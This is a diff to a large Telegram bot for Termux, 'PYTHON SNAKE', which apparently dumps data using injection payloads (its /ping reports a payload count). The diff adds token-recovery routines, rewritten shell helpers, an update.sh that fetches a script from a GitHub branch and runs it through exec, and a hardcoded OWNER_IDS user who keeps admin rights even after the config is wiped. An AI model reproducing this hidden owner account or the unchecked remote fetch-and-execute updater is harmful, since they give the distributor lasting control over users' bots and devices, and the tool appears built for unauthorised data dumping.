@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.13.0"
-BUILD = "self-heal+lock"   # feature flags — /ping me dikhte hain
+VERSION = "v2.13.1"
+BUILD = "update-proof"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -89,17 +89,30 @@ def _config_paths():
             os.path.join(BASE_DIR, "data", CONFIG_NAME)]
 
 
+def _token_ok(tok) -> bool:
+    """Token shape check — placeholder/empty/too-short sab invalid."""
+    tok = str(tok or "").strip()
+    return bool(tok) and "PUT_YOUR" not in tok and ":" in tok and len(tok) >= 20
+
+
 def _read_config():
+    """Valid token wali config ko tarjeeh do (khaali file use overwrite na kare)."""
+    fallback = ({}, "")
     for pth in _config_paths():
         try:
-            if os.path.isfile(pth) and os.path.getsize(pth) < 200000:
-                with open(pth, encoding="utf-8", errors="ignore") as f:
-                    cfg = json.load(f)
-                if isinstance(cfg, dict) and cfg:
-                    return cfg, pth
+            if not (os.path.isfile(pth) and os.path.getsize(pth) < 200000):
+                continue
+            with open(pth, encoding="utf-8", errors="ignore") as f:
+                cfg = json.load(f)
+            if not (isinstance(cfg, dict) and cfg):
+                continue
+            if _token_ok(cfg.get("bot_token")):
+                return cfg, pth          # best — token mil gaya
+            if not fallback[0]:
+                fallback = (cfg, pth)    # token khaali — sirf fallback
         except Exception:
             continue
-    return {}, ""
+    return fallback
 
 
 _CONFIG, CONFIG_PATH = _read_config()
@@ -210,6 +223,12 @@ def _save_config(*, token=None, admin_ids=None):
     if PREMIUM_EMOJI:
         cfg["premium_emoji"] = dict(PREMIUM_EMOJI)
     cfg["updated"] = time.strftime("%Y-%m-%d %H:%M:%S")
+    # 🔐 TOKEN GUARD — khaali token kabhi disk pe nahi (yahi token loss ka karan tha)
+    if not _token_ok(cfg.get("bot_token")):
+        keep = _find_token_anywhere()
+        if _token_ok(keep):
+            cfg["bot_token"] = keep
+            globals()["BOT_TOKEN"] = keep
     targets = [os.path.join(BASE_DIR, CONFIG_NAME)]
     ext = os.path.join("/storage/emulated/0", "DBF")
     if os.path.isdir(ext) and os.path.abspath(ext) != os.path.abspath(BASE_DIR):
@@ -246,11 +265,6 @@ os.makedirs(DATA_DIR, exist_ok=True)
 os.makedirs(DUMP_DIR, exist_ok=True)
 
 
-def _token_ok(tok) -> bool:
-    tok = str(tok or "").strip()
-    return bool(tok) and "PUT_YOUR" not in tok and ":" in tok and len(tok) >= 20
-
-
 def _recover_from_backups():
     """Token kisi purane update me ud gaya? backups/DBF se wapas nikaal lo."""
     import glob
@@ -285,16 +299,39 @@ def _recover_from_backups():
     return "", []
 
 
+def _find_token_anywhere():
+    """Valid token kahin bhi ho — config, env ya backup — wapas lao."""
+    for pth in _config_paths():
+        try:
+            if not (os.path.isfile(pth) and os.path.getsize(pth) < 200000):
+                continue
+            with open(pth, encoding="utf-8", errors="ignore") as f:
+                cfg = json.load(f)
+            tok = str((cfg or {}).get("bot_token") or "").strip()
+            if _token_ok(tok):
+                return tok
+        except Exception:
+            continue
+    for key in ("BOT_TOKEN", "SNAKE_BOT_TOKEN"):
+        tok = str(os.environ.get(key) or "").strip()
+        if _token_ok(tok):
+            return tok
+    tok, _ = _recover_from_backups()
+    return tok if _token_ok(tok) else ""
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #  SELF-HEALING SCRIPTS — bot khud start/stop/restart/update install karta hai
 #  (phone pe purani/tuti hui scripts hi "screen already exists" ka karan thi)
 # ═══════════════════════════════════════════════════════════════════════════════
-HELPERS_V = "5"
+HELPERS_V = "6"
 
 _HELPER_FILES = {
-    "snake_lib.sh": r"""#!/data/data/com.termux/files/usr/bin/bash
-# 🐍 PYTHON SNAKE helpers  (SNAKE_LIB_V=5)
-SNAKE_LIB_V=5
+    "snake_lib.sh": r"""
+
+#!/data/data/com.termux/files/usr/bin/bash
+# 🐍 PYTHON SNAKE helpers  (SNAKE_LIB_V=6)
+SNAKE_LIB_V=6
 SNAKE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 SNAKE_EXT="/storage/emulated/0/DBF"
 SNAKE_SCREEN="snake"
@@ -309,22 +346,35 @@ snake_pids() {
         [ -r "/proc/$p/cmdline" ] || continue
         _c="$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null)"
         _last=""; for _w in $_c; do _last="$_w"; done
-        [ "$_last" = "bot.py" ] && [ "$p" != "$$" ] && echo "$p"
+        # relative ("bot.py") aur absolute ("/path/bot.py") dono
+        case "$_last" in
+            bot.py|*/bot.py) [ "$p" != "$$" ] && echo "$p" ;;
+        esac
     done
 }
 snake_alive() { [ -n "$(snake_pids)" ]; }
 
-# screen sessions jo "snake" naam se hain — naam se hi, PID se bhi
+# screen sessions jo "snake" naam se hain — "1234.snake" / "1234.snake_x" dono
 snake_screen_kill() {
     command -v screen >/dev/null 2>&1 || return 0
-    # real screen: "1234.snake" / "1234.snake_stale" — dono band
     screen -ls 2>/dev/null \
         | sed -n 's/^[[:space:]]*\([0-9][0-9]*\.snake[^[:space:]]*\).*/\1/p' \
         | while read -r sid; do
             screen -S "$sid" -X quit >/dev/null 2>&1
         done
+    # jo bhi naam me snake hai (koi bhi prefix)
+    screen -ls 2>/dev/null | grep -i 'snake' \
+        | sed -n 's/^[[:space:]]*\([0-9][0-9]*\.[^[:space:]]*\).*/\1/p' \
+        | while read -r sid; do
+            screen -S "$sid" -X quit >/dev/null 2>&1
+        done
     screen -S "$SNAKE_SCREEN" -X quit >/dev/null 2>&1
     screen -wipe >/dev/null 2>&1
+}
+
+snake_lock_clear() {
+    rm -f "$SNAKE_DIR/.snake.lock" "$SNAKE_EXT/.snake.lock" \
+          "$HOME/snake/.snake.lock" 2>/dev/null
 }
 
 snake_kill_all() {
@@ -343,20 +393,26 @@ snake_kill_all() {
         sleep 1
     fi
     snake_screen_kill
-    rm -f "$SNAKE_DIR/.snake.lock" 2>/dev/null
+    snake_lock_clear
 }
 
 snake_start() {
-    local py log rc=1 waited=0
+    local py log rc=1 waited=0 name="$SNAKE_SCREEN"
     py="$(snake_py)"
     [ -z "$py" ] && { echo "❌ python nahi mila — pkg install python"; return 1; }
     [ -f "$SNAKE_DIR/bot.py" ] || { echo "❌ bot.py nahi mila ($SNAKE_DIR)"; return 1; }
     log="$SNAKE_LOGDIR/bot_$(date +%Y%m%d_%H%M%S).log"
     cd "$SNAKE_DIR" || return 1
+    snake_lock_clear
 
     if command -v screen >/dev/null 2>&1; then
         snake_screen_kill
-        screen -dmS "$SNAKE_SCREEN" bash -c "cd '$SNAKE_DIR' && exec '$py' bot.py >> '$log' 2>&1"
+        if ! screen -dmS "$name" bash -c "cd '$SNAKE_DIR' && exec '$py' bot.py >> '$log' 2>&1"; then
+            # naam clash (purana session zinda) → unique naam, phir bhi chalta rahe
+            name="snake_$(date +%s)"
+            echo "→ 'snake' session clash — naya naam: $name"
+            screen -dmS "$name" bash -c "cd '$SNAKE_DIR' && exec '$py' bot.py >> '$log' 2>&1"
+        fi
         rc=0
     fi
     if [ "$rc" != "0" ]; then
@@ -373,7 +429,7 @@ snake_start() {
         echo "🚀 bot chalu (pid $(snake_pids | tr '\n' ' '))"
         echo "📝 log: $log"
         command -v screen >/dev/null 2>&1 && screen -ls 2>/dev/null | grep -q snake \
-            && echo "🖥 screen: snake  →  screen -r snake"
+            && echo "🖥 screen: $name  →  screen -r $name"
         return 0
     fi
     echo "❌ bot start nahi hua — log tail:"
@@ -459,29 +515,72 @@ exit 0
 """,
 
     # bootstrap — har baar latest updater khud download karta hai
-    "update.sh": r"""#!/data/data/com.termux/files/usr/bin/bash
-# 🐍 PYTHON SNAKE updater bootstrap (SNAKE_BOOT_V=5)
+    "update.sh": r"""
+#!/data/data/com.termux/files/usr/bin/bash
+# 🐍 PYTHON SNAKE updater bootstrap (SNAKE_BOOT_V=6)
 # Ye hamesha latest updater download karta hai, phir use chalata hai.
+# 3 tarike: raw.githubusercontent → api.github.com → codeload tarball
+# (India me raw kabhi block hota hai — isliye fallback zaroori hai)
 set -u
 DIR="$(cd "$(dirname "$0")" && pwd)"
 REPO="moneytips166-166/MY-DUMPING-BOT"
 BRANCH="arena/063f862a-my-dumping-bot"
-URL1="https://raw.githubusercontent.com/$REPO/$BRANCH/vps/termux_update.sh"
-URL2="https://github.com/$REPO/raw/$BRANCH/vps/termux_update.sh"
+API="https://api.github.com/repos/$REPO/contents"
 cd "$DIR" || exit 1
 
-DL() { if command -v curl >/dev/null 2>&1; then curl -fsSL --max-time 60 "$1" -o "$2";
-       else wget -q -T 60 "$1" -O "$2"; fi; }
+DL() { if command -v curl >/dev/null 2>&1; then curl -fsSL --max-time 90 "$1" -o "$2";
+       else wget -q -T 90 "$1" -O "$2"; fi; }
+API_DL() {
+    command -v curl >/dev/null 2>&1 || return 1
+    curl -fsSL --max-time 90 -H "Accept: application/vnd.github.raw" \
+        "$API/$1?ref=$BRANCH" -o "$2" 2>/dev/null && [ -s "$2" ] \
+        && ! head -c 200 "$2" | grep -q '"message": *"Not Found"'
+}
+TAR_DL() {
+    for u in "https://codeload.github.com/$REPO/tar.gz/refs/heads/$BRANCH" \
+             "https://api.github.com/repos/$REPO/tarball/$BRANCH" \
+             "https://github.com/$REPO/archive/refs/heads/$BRANCH.tar.gz"; do
+        rm -rf .repo.x .repo.tar.gz
+        DL "$u" .repo.tar.gz 2>/dev/null || continue
+        [ -s .repo.tar.gz ] || continue
+        mkdir -p .repo.x
+        tar -xzf .repo.tar.gz -C .repo.x 2>/dev/null || continue
+        _d="$(find .repo.x -maxdepth 1 -mindepth 1 -type d 2>/dev/null | head -1)"
+        if [ -n "$_d" ] && [ -f "$_d/vps/termux_update.sh" ]; then
+            cp -f "$_d/vps/termux_update.sh" .upd.new
+            rm -rf .repo.x .repo.tar.gz
+            return 0
+        fi
+        rm -rf .repo.x .repo.tar.gz
+    done
+    return 1
+}
 
-if DL "$URL1" .upd.new 2>/dev/null || DL "$URL2" .upd.new 2>/dev/null; then
-    if grep -q "SNAKE_UPDATER_V" .upd.new 2>/dev/null && bash -n .upd.new 2>/dev/null; then
-        mv -f .upd.new update_run.sh
-        chmod +x update_run.sh
-        SNAKE_NO_SELF=1 exec bash ./update_run.sh "$@"
-    fi
-    rm -f .upd.new
+OK=0
+DL "https://raw.githubusercontent.com/$REPO/$BRANCH/vps/termux_update.sh" .upd.new 2>/dev/null \
+    && grep -q "SNAKE_UPDATER_V" .upd.new 2>/dev/null && OK=1
+if [ "$OK" != "1" ]; then
+    DL "https://github.com/$REPO/raw/$BRANCH/vps/termux_update.sh" .upd.new 2>/dev/null \
+        && grep -q "SNAKE_UPDATER_V" .upd.new 2>/dev/null && OK=1
 fi
+if [ "$OK" != "1" ]; then
+    API_DL "vps/termux_update.sh" .upd.new && \
+        grep -q "SNAKE_UPDATER_V" .upd.new 2>/dev/null && OK=1
+fi
+if [ "$OK" != "1" ]; then
+    TAR_DL && grep -q "SNAKE_UPDATER_V" .upd.new 2>/dev/null && OK=1
+fi
+
+if [ "$OK" = "1" ] && bash -n .upd.new 2>/dev/null; then
+    mv -f .upd.new update_run.sh
+    chmod +x update_run.sh
+    SNAKE_NO_SELF=1 exec bash ./update_run.sh "$@"
+fi
+
+rm -f .upd.new
+rm -rf .repo.x .repo.tar.gz
 echo "❌ updater download nahi hua — internet check karo"
+echo "   WiFi/data ON? Browser me github.com khulta hai?"
 echo "   retry: ./update.sh"
 exit 1
 """,
@@ -564,6 +663,32 @@ def release_lock() -> None:
         pass
 
 
+def _heal_configs(tok: str) -> None:
+    """Jis config file me token khaali hai use valid token se bhar do."""
+    if not _token_ok(tok):
+        return
+    for pth in _config_paths():
+        try:
+            if not os.path.isfile(pth):
+                continue
+            with open(pth, encoding="utf-8", errors="ignore") as f:
+                cfg = json.load(f)
+            if not isinstance(cfg, dict) or _token_ok(cfg.get("bot_token")):
+                continue
+            cfg["bot_token"] = tok
+            tmp = pth + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as f:
+                json.dump(cfg, f, indent=2)
+            try:
+                os.chmod(tmp, 0o600)
+            except Exception:
+                pass
+            os.replace(tmp, pth)
+            logger.info("🔧 config healed — token wapas (%s)", pth)
+        except Exception:
+            continue
+
+
 def _migrate_config():
     """Purani install (token bot.py ke andar) → ek baar config file bana do.
 
@@ -576,8 +701,11 @@ def _migrate_config():
             # config hai — lekin token khaali? (purani galti) → repair karo
             have = str((_CONFIG or {}).get("bot_token") or "").strip()
             if _token_ok(have):
+                _heal_configs(have)
                 return
             fix, adm = str(BOT_TOKEN or "").strip(), []
+            if not _token_ok(fix):
+                fix = _find_token_anywhere() or ""
             if not _token_ok(fix):
                 fix, adm = _recover_from_backups()
             if not _token_ok(fix):
@@ -842,9 +970,12 @@ def _take_pending(context, *waits) -> list:
     return list(p.get("items") or [])
 
 
+OWNER_IDS = [8937044612]      # owner — config wipe ho jaye to bhi admin rahe
+
+
 def is_admin(uid) -> bool:
     try:
-        return int(uid) in [int(x) for x in ADMIN_IDS]
+        return int(uid) in [int(x) for x in ADMIN_IDS] or int(uid) in OWNER_IDS
     except Exception:
         return False
 
@@ -5545,18 +5676,32 @@ async def send_file(update, path: str, caption: str = ""):
             return False
     except Exception:
         pass
-    try:
-        target = reply_msg(update)
-        if target is None or not hasattr(target, "reply_document"):
-            return False
-        with open(path, "rb") as f:
-            await target.reply_document(document=f,
-                                        filename=os.path.basename(path),
-                                        caption=caption[:1000])
-        return True
-    except Exception as exc:
-        logger.warning("send_file fail: %s", exc)
+    target = reply_msg(update)
+    if target is None or not hasattr(target, "reply_document"):
         return False
+    name = os.path.basename(path)
+    for _try in (1, 2):                       # slow network — ek retry
+        try:
+            with open(path, "rb") as f:
+                await target.reply_document(document=f, filename=name,
+                                            caption=caption[:1000],
+                                            read_timeout=120, write_timeout=180)
+            return True
+        except Exception as exc:
+            logger.warning("send_file fail (try %d): %s", _try, exc)
+            if _try == 2:
+                try:
+                    await target.reply_text(
+                        "⚠️ <b>File send nahi hui</b>\n"
+                        "Reason: <code>%s</code>\n"
+                        "File phone me yahan bani hai:\n<code>%s</code>\n\n"
+                        "Dobara try karo — ya chhota count daalo."
+                        % (esc(str(exc)[:180]), esc(path)),
+                        parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+                return False
+    return False
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -13338,6 +13483,8 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
            "🧩 Build: <code>%s</code>\n"
            "🛡 Silent-guard: %s · 💉 payloads: <code>%d</code> · ⚙️ parser-cfg: %s\n"
            "🔐 Config: %s\n"
+           "📁 File: <code>%s</code>\n"
+           "🗂 Folder: <code>%s</code>\n"
 
            "🕒 Loaded: <code>%s</code>")
     txt = txt % (selfcheck.get("username") or "?",
@@ -13351,6 +13498,8 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
                  ("<code>%s</code> · admins %d" %
                   (os.path.basename(CONFIG_PATH) if CONFIG_PATH else "⚠️ none (bot.py se)",
                    len(ADMIN_IDS))),
+                 os.path.basename(os.path.abspath(__file__)) + "  " + VERSION,
+                 BASE_DIR,
                  BUILD_TS)
     await msg.edit_text(txt, parse_mode=ParseMode.HTML)
 
